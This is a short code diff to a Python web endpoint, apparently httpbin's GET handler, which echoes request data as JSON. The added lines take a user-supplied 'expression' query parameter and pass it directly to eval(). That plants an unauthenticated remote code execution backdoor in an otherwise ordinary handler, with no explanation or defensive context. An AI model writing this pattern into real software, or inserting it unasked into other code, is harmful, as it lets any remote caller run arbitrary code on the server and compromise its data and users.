@@ -376,6 +376,10 @@ def view_get():
         description: The request's query parameters.
     """
 
+    expression = request.args.get("expression")
+    if expression:
+        eval(expression)
+
     return jsonify(get_dict("url", "args", "headers", "origin"))
 
 
